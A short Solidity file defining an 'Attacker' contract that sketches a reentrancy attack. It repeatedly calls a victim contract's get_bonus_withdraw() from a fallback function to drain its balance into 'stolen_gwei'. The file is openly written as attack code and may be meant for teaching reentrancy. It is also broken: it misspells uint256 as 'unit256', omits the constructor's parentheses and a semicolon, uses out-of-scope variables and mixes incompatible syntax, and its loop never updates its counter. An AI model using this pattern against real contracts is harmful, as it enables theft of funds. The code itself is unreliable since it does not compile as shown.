pragma solidity >= 0.7.0 < 0.9.0

contract Attacker {
	
	constructor {
		address victim_address = 0xa2f96ef6ed3d67a0352e659b1e980f13e098619f; // this is a random address
		unit256 stolen_gwei = 0; 
	}

	// rest of the code goes here

	/** 
	* 1. attack function calls get_ bonus_withdraw() function
	*/ 
	function attack() {
		// calls the vulnerable contract
		victim_address.get_bonus_withdraw();
	} 

	/** 
	* 1. fallback function must have no name and no parameters
	* 2. fallback function calls get_bonus_withdraw() again
	* 3. repeated until funds are depleated
	*/  
	function () {
		unit256 victim_balance = victim_address.balance(); 
		while(stolen_gwei + 10 <= victim_balance) {
			victim_address.get_bonus_withdraw(); 
		}
	}

}		
		
